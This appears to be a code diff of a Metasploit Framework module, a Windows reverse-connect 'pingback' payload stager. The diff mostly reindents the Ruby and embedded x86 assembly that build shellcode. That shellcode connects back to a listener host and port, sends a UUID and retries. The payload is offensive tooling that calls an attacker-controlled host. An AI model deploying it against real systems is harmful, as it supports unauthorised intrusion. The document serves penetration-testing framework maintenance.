@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 307
 
   include Msf::Payload::Windows
@@ -29,28 +27,29 @@ module MetasploitModule
         'Session' => Msf::Sessions::Pingback
       )
     )
+  end
 
-    def required_space
-      # Start with our cached default generated size
-      space = cached_size
+  def required_space
+    # Start with our cached default generated size
+    space = cached_size
 
-      # EXITFUNK 'seh' is the worst case, that adds 15 bytes
-      space += 15
+    # EXITFUNK 'seh' is the worst case, that adds 15 bytes
+    space += 15
 
-      space
-    end
+    space
+  end
 
-    def generate(_opts = {})
-      encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack1('N')
-      encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack1('V')
-      retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
-      pingback_count = datastore['PingbackRetries']
-      pingback_sleep = datastore['PingbackSleep']
-      self.pingback_uuid ||= generate_pingback_uuid
-      uuid_as_db = '0x' + self.pingback_uuid.chars.each_slice(2).map(&:join).join(',0x')
-      conf = { exitfunk: datastore['EXITFUNC'] }
+  def generate(_opts = {})
+    encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack1('N')
+    encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack1('V')
+    retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
+    pingback_count = datastore['PingbackRetries']
+    pingback_sleep = datastore['PingbackSleep']
+    self.pingback_uuid ||= generate_pingback_uuid
+    uuid_as_db = '0x' + self.pingback_uuid.chars.each_slice(2).map(&:join).join(',0x')
+    conf = { exitfunk: datastore['EXITFUNC'] }
 
-      asm = %^
+    asm = %^
         cld                    ; Clear the direction flag.
         call start             ; Call start, this pushes the address of 'api_call' onto the stack.
         #{asm_block_api}
@@ -129,20 +128,20 @@ module MetasploitModule
           push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
           call ebp                ; closesocket(socket)
         ^
-      if pingback_count > 0
-        asm << %^
+    if pingback_count > 0
+      asm << %^
           mov eax, [esi+12]
           test eax, eax               ; pingback counter
           jz exitfunk
           dec [esi+12]
           sleep:
-            push #{(pingback_sleep * 1000)}
+            push #{pingback_sleep * 1000}
             push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
             call ebp                  ;sleep(pingback_sleep * 1000)
             jmp create_socket
         ^
-      end
-      asm << %(
+    end
+    asm << %(
           ; restore the stack back to the connection retry count
           dec [esi+8]               ; decrement the retry counter
           jmp exitfunk
@@ -150,10 +149,9 @@ module MetasploitModule
           jnz create_socket
           jmp failure
       )
-      if conf[:exitfunk]
-        asm << asm_exitfunk(conf)
-      end
-      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
+    if conf[:exitfunk]
+      asm << asm_exitfunk(conf)
     end
+    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
   end
 end
